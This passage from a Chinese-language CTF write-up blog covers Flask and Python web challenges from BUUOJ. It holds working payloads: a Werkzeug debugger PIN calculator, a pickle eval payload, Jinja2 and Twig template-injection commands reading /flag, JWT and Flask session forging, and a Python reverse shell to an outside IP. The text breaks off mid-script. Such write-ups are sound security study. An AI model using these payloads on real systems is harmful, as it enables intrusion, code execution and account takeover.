class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377957891&#x27;</span>,<span class="comment"># address</span></span><br><span class="line">    <span class="string">&#x27;e96996169e90130c1b6e2b3fb9af5b39abcacc1b1f84211a58e27854c3a1219e&#x27;</span><span class="comment"># machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706162426.png" alt=""></p>
+<p>system好像被禁用了，换成popen函数</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706163643.png" alt=""></p>
+<h2 id="RootersCTF2019-I-❤️-Flask">RootersCTF2019 I_❤️_Flask</h2>
+<h2 id="CSCCTF-2019-Qual-FlaskLight">CSCCTF 2019 Qual FlaskLight</h2>
+<h2 id="pasecactf-2019-flask-ssti">pasecactf_2019 flask_ssti</h2>
+<h2 id="CISCN2019-华北赛区-Web2-ikun">CISCN2019 华北赛区 Web2 ikun</h2>
+<h3 id="考点-v2">考点</h3>
+<ul>
+<li>逻辑漏洞</li>
+<li>JWT伪造</li>
+<li>pickle反序列化</li>
+</ul>
+<h3 id="解题-v2">解题</h3>
+<p>python脚本寻找LV6商品所在页面</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4186a81c-5092-4d1c-b2c3-6d753ef436c7.node3.buuoj.cn/shop?page=&#123;&#125;&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;_xsrf&quot;</span>: <span class="string">&quot;2|9abd3196|175f180123b348c52281c861b9ea6ba9|1593758159&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JWT&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhMDFoIn0.xjww69DlZAtZw_26KzwvCZc&quot;</span></span><br><span class="line">           <span class="string">&quot;-WhNxACW3PuvxHlQQ2yg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;commodity_id&quot;</span>: <span class="string">&quot;2|1:0|10:1593758858|12:commodity_id|4:Nw&quot;</span></span><br><span class="line">                    <span class="string">&quot;==|42eb3fadf203ceac3f14f89b8e7a575d5350b31a29c08f6a939d099435027244 &quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">501</span>):</span><br><span class="line">    rq = requests.get(url=url.format(i), cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;/static/img/lv/lv6.png&quot;</span> <span class="keyword">in</span> rq.text:</span><br><span class="line">        print(url.format(i))</span><br></pre></td></tr></table></figure>
+<p>跑出来的结果是<code>page=181</code></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703150520.png" alt=""></p>
+<p>但是看到这个价格很显然是要通过某种漏洞来购买，先抓包，看到参数后想到两种办法，一是直接改价格，二是改折扣。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152451.png" alt=""></p>
+<p>尝试之后发现改价格没有用，改折扣提示不是admin</p>
+<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152637.png" style="zoom:50%;" />
+<p>这个地方就很自然想到要越权，修改密码处没有逻辑漏洞，但是Cookie中包含JWT，放到jwt.io网址上解析后：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152814.png" alt=""></p>
+<p>如果想要伪造一个admin的JWT需要知道secret。感觉这个地方就有点脑洞了，要用<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">工具</a>去爆破，我还找了很久的注入点。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703152940.png" alt=""></p>
+<p>再去伪造admin的JWT</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703153100.png" alt=""></p>
+<p>更改cookie的值</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703153207.png" alt=""></p>
+<p>查看个人中心，出现了一个hint</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u8fd9\u7f51\u7ad9\u4e0d\u4ec5\u53ef\u4ee5\u4ee5\u8585\u7f8a\u6bdb\uff0c\u6211\u8fd8\u7559\u4e86\u4e2a\u540e\u95e8\uff0c\u5c31\u85cf\u5728\u006c\u0076\u0036\u91cc</span><br></pre></td></tr></table></figure>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703154225.png" alt=""></p>
+<p>查看源码发现源码包：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703153940.png" alt=""></p>
+<p>题目提示了pickle，直接全局搜索，<code>Admin.py</code>有pickle反序列化漏洞</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703160455.png" alt=""></p>
+<p>利用脚本生成payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure>
+<p>将生成的payload放到隐藏的输入框里，只需将<code>hidden=&quot;hidden&quot;</code>删除即可。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703160604.png" alt=""></p>
+<h2 id="SUCTF-2019-Pythonginx">SUCTF 2019 Pythonginx</h2>
+<h2 id="WesternCTF2018-shring">WesternCTF2018 shring</h2>
+<h3 id="考点-v3">考点</h3>
+<h3 id="解题-v3">解题</h3>
+<p>源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="TODO">TODO</h3>
+<h2 id="护网杯2018-easy-tornado">护网杯2018 easy_tornado</h2>
+<h3 id="考点-v4">考点</h3>
+<ul>
+<li>tornado 模板注入</li>
+</ul>
+<h3 id="解题-v4">解题</h3>
+<p>这道题很重要的一个地方就是观察url</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;65cdf038-1123-4f28-aedb-3369e8c68049.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;hints.txt&amp;filehash&#x3D;eca90b16e91faf8d52c04e7ef7e7a8fc</span><br></pre></td></tr></table></figure>
+<p>并且filehash=md5(cookie_secret+md5(filename))，所以要找到cookie_secret的值。</p>
+<p>当不输入filehash参数的时候，url是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;65cdf038-1123-4f28-aedb-3369e8c68049.node3.buuoj.cn&#x2F;error?msg&#x3D;Error</span><br></pre></td></tr></table></figure>
+<p>并且页面回显Error，这个就需要比较敏感的注意到这里是模板注入的点。</p>
+<p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#3-Tornado">参考文章</a>用的就是handler.settings对象</p>
+<blockquote>
+<p>handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所有handler.settings就指向RequestHandler.application.settings了。</p>
+</blockquote>
+<p>所以传递<code>error?msg=&#123;&#123; handler.settings &#125;&#125;</code>得到cookie_secret。</p>
+<h2 id="HCTF-2018-Hideandseek">HCTF 2018 Hideandseek</h2>
+<h3 id="TODO-v2">TODO</h3>
+<h2 id="CISCN2019-总决赛-Day1-Web3-Flask-Message-Board">[CISCN2019 总决赛 Day1 Web3]Flask Message Board</h2>
+<h3 id="TODO-v3">TODO</h3>
+<h2 id="HCTF2018-Admin">HCTF2018 Admin</h2>
+<p>出题人writeup：<a target="_blank" rel="noopener" href="https://www.ckj123.com/?p=147">https://www.ckj123.com/?p=147</a></p>
+<h3 id="考点-v5">考点</h3>
+<ul>
+<li>Flask Session伪造</li>
+<li>Unicode欺骗</li>
+<li>条件竞争</li>
+</ul>
+<h3 id="解题-v5">解题</h3>
+<h4 id="方法一-Unicode编码欺骗">方法一 Unicode编码欺骗</h4>
+<p>结合改密码的功能，看一下<code>change</code>函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br></pre></td></tr></table></figure>
+<p>其中第6行的<code>strlower</code>是自己封装的一个函数，并没有使用Python的库函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span>(<span class="params">username</span>):</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>
+<p>其中 <code>nodeprep</code> 来自 <code>twisted.words.protocols.jabber.xmpp_stringprep</code>。</p>
+<p>并且在注册和登录的代码中都使用了这个函数，所以不能用<code>ADMIN</code>绕过。</p>
+<p>这里有一篇文章讲到了nodeprep关于Unicode编码的问题：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e">https://tw.saowen.com/a/72b7816b29ef30533882a07a4e1040f696b01e7888d60255ab89d37cf2f18f3e</a></p>
+</blockquote>
+<p>使用两次<code>nodeprep.prepare</code>函数会进行如下操作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬ -&gt; A -&gt; a</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Unicode —&gt; 中文：<a target="_blank" rel="noopener" href="https://tool.chinaz.com/tools/unicode.aspx">https://tool.chinaz.com/tools/unicode.aspx</a></p>
+</blockquote>
+<p>即第一次将其转换为大写，第二次将其转换为小写。</p>
+<p>思路：</p>
+<ul>
+<li>注册用户ᴬdmin</li>
+<li>登录用户ᴬdmin，变成Admin</li>
+<li>修改密码Admin，更改了admin的密码</li>
+</ul>
+<h4 id="方法二-Flask-session-伪造">方法二 Flask session 伪造</h4>
+<blockquote>
+<p>原理：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/client-session-security.html">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>
+<p>工具：<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
+</blockquote>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619223051.png" alt=""></p>
+<p>修改<code>name</code>为<code>admin</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;6604bc7a9890f6bf08233451da34826f785818ecb989720b4c7e7aa4f22105e0b28a5122c9e9b490f8c9609baa8efab128409afc0a7ce5ba93ccd50994d78d37&#39;, &#39;csrf_token&#39;: b&#39;135d7b0b615153fd276627d995e71a0026f75bb3&#39;, &#39;image&#39;: b&#39;mwPn&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;</span><br></pre></td></tr></table></figure>
+<p>再对其进行encode操作：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619223440.png" alt=""></p>
+<p>更改cookie的值：</p>
+<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619223656.png" style="zoom:67%;" />
+<p>提交更改，刷新页面，成功获取flag~</p>
+<h4 id="方法三-条件竞争">方法三 条件竞争</h4>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://tmr.js.org/p/3a03e44b/">https://tmr.js.org/p/3a03e44b/</a></p>
+<p>不由的感叹这些人的脑子怎么这么好使。。。😂</p>
+</blockquote>
+<h2 id="BJDCTF-2nd-fake-google">BJDCTF 2nd fake google</h2>
+<h3 id="考点-v6">考点</h3>
+<ul>
+<li>Flask SSTI 文件读取</li>
+</ul>
+<h3 id="解题-v6">解题</h3>
+<p>这道题就是比较明显的Flask 模板注入漏洞了，也没有什么绕过，直接上payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%&#125;&#123;%%20if%20c.__name__&#x3D;&#x3D;%27catch_warnings%27%20%&#125;&#123;&#123;%20c.__init__.__globals__[%27__builtins__%27].eval(&quot;__import__(%27os%27).popen(%27cat%20&#x2F;flag%27).read()&quot;)%20&#125;&#125;&#123;%%20endif%20%&#125;&#123;%%20endfor%20%&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="BJDCTF2020-Cookie-is-stable">BJDCTF2020 Cookie is stable</h2>
+<h3 id="考点-v7">考点</h3>
+<ul>
+<li>Python Twig模板注入</li>
+</ul>
+<h3 id="解题-v7">解题</h3>
+<p>和上题一样是模板注入，不过注入点在Cookie里</p>
+<p>渲染引擎也换成了基于Python的Twig</p>
+<p>从网上找到的 Twig poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id=""></h3>
+<h2 id="V-N公开赛-CheckIn">V&amp;N公开赛 CheckIn</h2>
+<h3 id="考点-v8">考点</h3>
+<ul>
+<li>反弹shell</li>
+<li>文件描述符</li>
+</ul>
+<h3 id="解题-v8">解题</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route(&#x27;/flag&#x27;)</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/shell&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f flag.txt&quot;</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;app.py&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>shell路由可以执行命令，但是在执行命令之前flag.txt已经被删除了，并且不能回显命令执行的结果。</p>
+<p>首先肯定是想到反弹一个shell，用BUU小号开一个Linux主机，尝试有bash、curl、nc、python -c等，但是这里测试后发现这些常用的命令都被禁了，无法反弹Shell。最后再换成python3就可以成功反弹shell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc5fa49b-316a-47e1-8737-20050c013abe.node3.buuoj.cn&#x2F;shell?c&#x3D;python3%20-c%20%27import%20socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.2.25.118%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p&#x3D;subprocess.call([%22&#x2F;bin&#x2F;sh%22,%22-i%22]);%27</span><br></pre></td></tr></table></figure>
+<p>接下来的一个考点就是通过文件描述符来恢复文件。</p>
+<blockquote>
+<p>什么是文件描述符</p>
+<p>例如Python中，当我们open()函数打开一个文件时便创建了一个文件描述符，而后对这个文件描述符使用read()函数便是读取文件描述符中的内容，close()函数用于关闭/销毁这个文件描述符。</p>
+<p>文件描述符储存在什么地方：</p>
+<p><code>/proc/&lt;pid&gt;/fd/&lt;id&gt;</code></p>
+</blockquote>
+<p>查看<code>/proc</code>目录下的进程号</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708102353.png" alt=""></p>
+<p>查看进程号等于10下面的fd目录</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708102509.png" alt=""></p>
+<p>文件描述符等于3即为flag文件</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708102615.png" alt=""></p>
+<h2 id="CISCN2019-华东南赛区-Double-Secret">CISCN2019 华东南赛区 Double Secret</h2>
+<h3 id="考点-v9">考点</h3>
+<ul>
+<li>模板注入</li>
+<li>RC4加密</li>
+</ul>
+<h3 id="解题-v9">解题</h3>
+<p>扫目录得到secret，访问提示要有secret参数，Fuzz一下发现报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">File &quot;&#x2F;app&#x2F;app.py&quot;, line 35, in secret</span><br><span class="line">    if(secret&#x3D;&#x3D;None):</span><br><span class="line">        return &#39;Tell me your secret.I will encrypt it so others can\&#39;t see&#39;</span><br><span class="line">    rc&#x3D;rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #解密</span><br><span class="line">    deS&#x3D;rc.do_crypt(secret)</span><br><span class="line">    a&#x3D;render_template_string(safe(deS))</span><br><span class="line">    if &#39;ciscn&#39; in a.lower():</span><br><span class="line">        return &#39;flag detected!&#39;</span><br><span class="line">      return a</span><br></pre></td></tr></table></figure>
+<p>如果你传入了参数，那么它就会进行加密，可以看到是RC4加密，而且还泄露了密钥，密钥就是“HereIsTreasure”，而且通过报错，我们了解到这是flask的模板，而且python的版本是2.7的，那么我们可以利用flask的模板注入，执行命令，只不过需要进行RC4加密。</p>
+<p>RC4加密脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = list(range(<span class="number">256</span>))</span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = 